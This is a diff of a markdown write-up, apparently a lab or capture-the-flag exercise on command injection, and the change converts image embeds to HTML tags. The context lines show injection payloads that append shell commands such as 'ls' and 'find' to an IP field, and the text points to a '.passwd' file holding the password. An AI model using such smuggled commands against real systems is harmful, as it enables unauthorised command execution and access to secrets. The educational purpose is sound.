@@ -9,20 +9,20 @@ Because the application implements absolutely no input filtering, the user-suppl
 ```Bash
 127.0.0.1; ls -r /
 ```
-![[Foundations of Command and Code Injection Vulnerabilities.png | 300]]
+<img src="_attachments/Foundations%20of%20Command%20and%20Code%20Injection%20Vulnerabilities.png" width="300">
 
 
 ```sh
 127.0.0.1; find  / -name "ch*"
 ```
 
-![[Foundations of Command and Code Injection Vulnerabilities_1.png | 300]]
+<img src="_attachments/Foundations%20of%20Command%20and%20Code%20Injection%20Vulnerabilities_1.png" width="300">
 
 ```sh
 127.0.0.1; ls -la ./
 ```
 
-![[Foundations of Command and Code Injection Vulnerabilities_2.png | 300]]
+<img src="_attachments/Foundations%20of%20Command%20and%20Code%20Injection%20Vulnerabilities_2.png" width="300">
 
 The password is in the file `.passwd`
 
